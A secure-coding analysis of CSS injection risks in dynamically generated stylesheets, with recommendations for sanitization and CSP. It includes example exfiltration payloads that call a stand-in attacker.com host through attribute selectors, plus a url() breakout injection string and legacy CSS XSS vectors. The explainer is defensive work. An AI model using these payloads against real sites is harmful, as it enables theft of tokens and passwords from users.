# Security Analysis: Dynamically Generated CSS

Dynamically generating CSS from user input introduces several sophisticated security risks. While often overlooked compared to JavaScript injection (XSS), CSS injection can lead to complete account compromise or data theft.

## 1. Security Risks

### UI Manipulation & Clickjacking
Attackers can inject CSS to:
- **Overlay Elements**: Place an invisible `<div>` or button over legitimate UI elements to trick users into performing unintended actions (Clickjacking).
- **Hide Content**: Hide security warnings, multi-factor authentication prompts, or legitimate transaction details using `display: none` or `visibility: hidden`.
- **Phishing**: Inject CSS that displays fake login forms or "Update Password" banners that blend perfectly with the application's design.

### Data Exfiltration (CSS-based Tainting)
This is a highly effective, though advanced, technique for stealing sensitive data from the DOM without JavaScript:
- **Attribute Selectors**: Attackers can use attribute selectors to leak data character by character. 
  - *Example*: `input[value^="a"] { background: url('https://attacker.com/leak?char=a'); }`
  - If the input value starts with 'a', the browser makes a request to the attacker's server. By chaining these, attackers can steal CSRF tokens, passwords, or personal data.
- **Scrollbar Triggering**: Using custom scrollbar styles to trigger a network request when a certain element is rendered (leaking data presence).
- **Custom Fonts/Ligatures**: Creating a custom font where specific sensitive strings (like a token) trigger a ligature replacement that loads a unique background image from the attacker's server.

### Cross-Site Scripting (XSS)
In certain browsers or older engines, CSS can execute code:
- `expression()` in IE.
- `-moz-binding` for XBL in older Firefox.
- `background: url("javascript:alert(1)")` in very old browser versions.

## 2. Analysis of Bad Practice Example

```html
<style>
body {
  background: url("{{ user_input }}");
}
</style>
```

### Risk Evaluation:
1.  **Direct CSRF/Tracking**: If `user_input` is just a URL, an attacker can force the victim's browser to make a GET request to any internal or external URL. This can be used for tracking or triggering state-changing actions on internal networks (CSRF).
2.  **XSS Escape**: If not properly escaped, an attacker can input:
    `#"); } input[value^="a"] { background: url("https://attacker.com/leak?a"); } body { background: url("#`
    This breaks out of the `url()` property and injects a new CSS rule to steal data via attribute selectors.
3.  **Content Security Policy (CSP) Bypass**: If the application allows inline styles but restricts scripts, an attacker can still exfiltrate data using the CSS techniques mentioned above.

## 3. Recommendations
- **Avoid Dynamic CSS**: Prefer predefined CSS classes and toggle them via JavaScript.
- **Strict Sanitization**: If you must generate CSS, use a CSS-specific sanitizer. Do not rely on generic HTML escaping.
- **Content Security Policy**: Use a strong CSP that restricts `style-src` and `img-src`. Avoid `unsafe-inline` for styles.
